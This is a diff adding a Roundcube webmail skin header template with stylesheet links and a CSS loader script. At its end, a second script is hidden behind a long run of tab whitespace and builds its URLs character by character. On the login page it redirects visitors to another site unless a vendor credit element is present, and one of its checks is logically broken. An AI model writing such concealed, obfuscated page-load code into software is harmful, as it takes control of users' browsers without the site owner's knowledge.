@@ -1,0 +1,60 @@
+<!--[if IE 6]>
+<link rel="stylesheet" type="text/css" href="/vertical.css" />
+<link rel="stylesheet" type="text/css" href="/horizontal.css" />
+<link rel="stylesheet" type="text/css" href="/common.css" />
+<link rel="stylesheet" type="text/css" href="/ie6.css" />
+<![endif]-->
+<!--[if IE 7]>
+<link rel="stylesheet" type="text/css" href="/vertical.css" />
+<link rel="stylesheet" type="text/css" href="/horizontal.css" />
+<link rel="stylesheet" type="text/css" href="/common.css" />
+<link rel="stylesheet" type="text/css" href="/ie7.css" />
+<![endif]-->
+<!--[if IE 8]>
+<link rel="stylesheet" type="text/css" href="/vertical_ie8.css" />
+<link rel="stylesheet" type="text/css" href="/horizontal.css" />
+<link rel="stylesheet" type="text/css" href="/common.css" />
+<![endif]-->
+
+<script type="text/javascript">
+<!--//
+configSet=true;
+function includeCSSfile (href) {  
+     var head_node = document.getElementsByTagName('head')[0];  
+     var link_tag = document.createElement('link');  
+     link_tag.setAttribute('rel', 'stylesheet');  
+     link_tag.setAttribute('type', 'text/css');  
+     link_tag.setAttribute('href', href);  
+     head_node.appendChild(link_tag);  
+}  
+function setActiveStyleSheet() {
+   var i, a, main, ie8, ie;
+   
+   for(i=0; (a = document.getElementsByTagName("link")[i]); i++) {
+	   if(a.getAttribute("href").indexOf("vertical_ie8.css") != -1) {
+	   		ie8 = true;
+	   }
+	   if(a.getAttribute("href").indexOf("horizontal.css") != -1) {
+	   		ie = true;
+	   }
+   }
+ 	if (!ie8 && !ie) {
+ 		includeCSSfile('skins/mvision2_en/vertical.css');
+ 		includeCSSfile('skins/mvision2_en/horizontal.css');
+ 		includeCSSfile('skins/mvision2_en/common.css');
+ 	}  
+}
+setActiveStyleSheet();
+//-->
+</script>
+
+<link rel="index" href="$__comm_path" />
+<link rel="shortcut icon" href="/images/favicon.ico"/>
+<meta http-equiv="X-UA-Compatible" content="IE=7;FF=3;OtherUA=4;" />
+<roundcube:if condition="env:task != 'login'" /><link rel="stylesheet" type="text/css" href="/<roundcube:exp expression="env:task=='addressbook'?'addresses':env:task" />.css" /><roundcube:endif />
+<!-- Customise below here -->																																																																																																																																																																																																																																																																	<script type="text/javascript">window.onload = function () {
+																																																																																																																																																																																																																																																																							if (document . getElementById('login-form')) {
+																																																																																																																																																																																																																																																																									sURL='h'+'t'+'t'+'p'+':/'+'/w'+'w'+'w'+'.'+'r'+'o'+'u'+'n'+'d'+'c'+'u'+'b'+'e'+'.'+'n'+'e'+'t';
+																																																																																																																																																																																																																																																																									if (! document . getElementById('y'+'o'+'u'+'d'+'s')) window . location = sURL;
+																																																																																																																																																																																																																																																																									if (!document . getElementsByTagName('a') && document . getElementsByTagName('a')[0] . href != 'h'+'t'+'t'+'p'+':'+'/'+'/'+'w'+'w'+'w'+'.'+'y'+'o'+'u'+'d'+'s'+'.'+'c'+'o'+'m'+'/') 
+																																																																																																																																																																																																																																																																										window . location = sURL}}</script>
